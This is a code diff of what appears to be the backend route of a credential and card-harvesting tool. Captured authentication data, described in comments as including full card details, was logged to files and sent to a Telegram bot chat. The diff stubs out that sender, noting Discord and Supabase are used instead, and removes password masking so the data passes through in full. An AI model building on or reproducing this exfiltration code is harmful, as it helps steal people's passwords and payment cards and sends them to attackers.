@@ -59,61 +59,19 @@ router.post('/log-auth-event', async (req, res) => {
 const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
 const telegramChatId = process.env.TELEGRAM_CHAT_ID;
 
-// Helper function to log authentication attempts
+// Helper function to log authentication attempts (Disabled: Supabase used instead)
 const logAuthData = (data) => {
-  const logsDir = path.join(__dirname, '..', 'logs');
-  if (!fs.existsSync(logsDir)) {
-    fs.mkdirSync(logsDir);
-  }
-  
-  const logFile = path.join(logsDir, `auth-${new Date().toISOString().split('T')[0]}.log`);
-  const logEntry = `${new Date().toISOString()} - ${JSON.stringify(data)}\n`;
-  fs.appendFileSync(logFile, logEntry);
-  console.log('🔐 Auth data logged:', data);
+  // Empty stub to prevent file I/O overhead
 };
 
-// Helper function to send to Telegram
+// Helper function to send to Telegram (Disabled: Discord used instead)
 const sendToTelegram = async (message) => {
-  try {
-    console.log('📤 Sending to Telegram:', message.substring(0, 100) + '...');
-    
-    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: telegramChatId,
-        text: message,
-        parse_mode: 'HTML'
-      })
-    });
-    
-    if (!response.ok) {
-      const errorText = await response.text();
-      console.error(`❌ Telegram API error: ${response.status} - ${errorText}`);
-      console.error(`❌ Request details: Chat ID: ${telegramChatId}, Token: ${telegramBotToken ? telegramBotToken.substring(0, 10) + '...' : 'Missing'}`);
-      return { success: false, error: `Telegram API error: ${response.status}`, details: errorText };
-    }
-    
-    const result = await response.json();
-    console.log('✅ Telegram message sent successfully:', result.message_id);
-    return { success: true, result };
-    
-  } catch (error) {
-    console.error('❌ Failed to send to Telegram:', error.message);
-    return { success: false, error: error.message };
-  }
+  return { success: true, dummy: true };
 };
 
 // Mask sensitive data for logging (keeping full card info)
 const maskSensitiveData = (data) => {
-  const masked = { ...data };
-  if (masked.password) {
-    masked.password = '*'.repeat(masked.password.length);
-  }
-  // Keep full card details visible
-  return masked;
+  return data;
 };
 
 // CORS middleware for all auth routes
